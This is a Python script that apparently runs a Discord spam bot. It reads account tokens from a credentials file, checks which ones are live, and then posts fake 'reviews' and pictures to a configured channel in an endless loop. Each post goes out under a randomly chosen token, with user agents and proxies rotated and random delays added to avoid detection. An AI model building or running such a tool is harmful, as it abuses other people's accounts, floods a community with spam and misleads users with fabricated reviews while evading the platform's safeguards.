import random
import logging
import requests
import json
import time
import re
from datetime import datetime
from os import listdir
from os.path import isfile, join

logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;9m[\x1b[0m%(asctime)s\x1b[38;5;9m]\x1b[0m %(message)s\x1b[0m",
    datefmt="%H:%M:%S"
)

def getPicturesList():
    files = ['./data/pictures/' + f for f in listdir('./data/pictures') if isfile(join('./data/pictures', f))]
    return files

def getDataFromFile(name):
    data = []
    for line in open(name):
        data.append(line.replace("\n", ""))
    return data

def extractToken(token_credentials):
    m = re.search(':(OT.+)', token_credentials)
    return m.group(1) if m else False

def tokenChecker(token):
    response = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
    return True if response.status_code == 200 else False

def autoTyper(token, user_agent, proxy, message, picture, config):
    logging.info(f"@ Sending message with token : {token}  - message : {message} - User Agent : {user_agent}")

    header = { 'Authorization': token, 'User-Agent': user_agent}

    proxies = {
        'http': f'http://{proxy}',
        'https': f'https://{proxy}',
    }

    # Optional message to send with the picture
    payload = {
        "content": message
    }

    # File
    if picture:
        files = {
            "file" : (f"./{picture}", open(f"./{picture}", 'rb')) # The picture that we want to send in binary
        }
        r = requests.post(f"https://discord.com/api/v9/channels/{config['ChannelID']}/messages", data=payload, headers=header, files=files)
    else:
        r = requests.post(f"https://discord.com/api/v9/channels/{config['ChannelID']}/messages", data=payload, headers=header)

def main():

    
    message_mode = ['message', 'picture', 'message and picture']
    config_file = open('config.json')
    config = json.load(config_file)

    tokens = getDataFromFile("data/tokens.txt")
    proxies = getDataFromFile("data/proxies.txt")
    reviews = getDataFromFile("data/reviews.txt")
    user_agents = getDataFromFile("data/user_agents.txt")
    pictures = getPicturesList()

        
    reviews_used = []
    pictures_used = []


    while True:

        # Select token and checking if is actif
        selected_token = extractToken(random.choice(tokens))
        checking = tokenChecker(selected_token)
        if (checking):
            logging.info(f"@ Token Actif")

            # Selection message type
            selected_mode = random.choice(message_mode)
            logging.info(f"@ Mode selected is : {selected_mode}")
            selected_message = ''
            selected_picture = False
            if selected_mode == 'message' or selected_mode == 'message and picture' :
                if(not len(reviews)):
                    reviews = reviews_used
                    reviews_used = []
                selected_message = random.choice(reviews)
                reviews.remove(selected_message)
                reviews_used.append(selected_message)
                
            if selected_mode == 'picture' or selected_mode == 'message and picture' : 
                if(not len(pictures)):
                    pictures = pictures_used
                    pictures_used = []
                selected_picture = random.choice(pictures)
                pictures.remove(selected_picture)
                pictures_used.append(selected_picture)
            
            # Send message
            autoTyper(selected_token, random.choice(user_agents), random.choice(proxies), selected_message, selected_picture, config)
            waiting = random.randint(config['DelayMin'], config['DelayMax'])
            logging.info(f"@ In waiting - {waiting} secondes")
            time.sleep(waiting)
        else : logging.info(f"@ Token Not Actif - {selected_token}")


if __name__ == '__main__':
    main()
